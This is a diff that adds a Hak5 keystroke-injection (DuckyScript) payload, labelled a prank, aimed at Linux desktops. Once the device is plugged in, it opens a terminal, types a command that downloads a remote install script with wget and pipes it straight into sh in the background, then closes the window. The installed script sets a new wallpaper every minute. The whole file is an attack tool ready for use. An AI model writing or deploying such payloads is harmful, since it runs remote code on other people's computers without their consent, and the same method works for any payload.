@@ -1,0 +1,20 @@
+REM Title: Zacky4Ever Tux style
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM Set a random Zack Efron wallpaper every minute.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING nohup wget -O - https://raw.githubusercontent.com/rusito-23/Zacky4Ever/master/remote.install.sh | sh &
+DELAY 300
+ENTER
+DELAY 500
+ALT F4
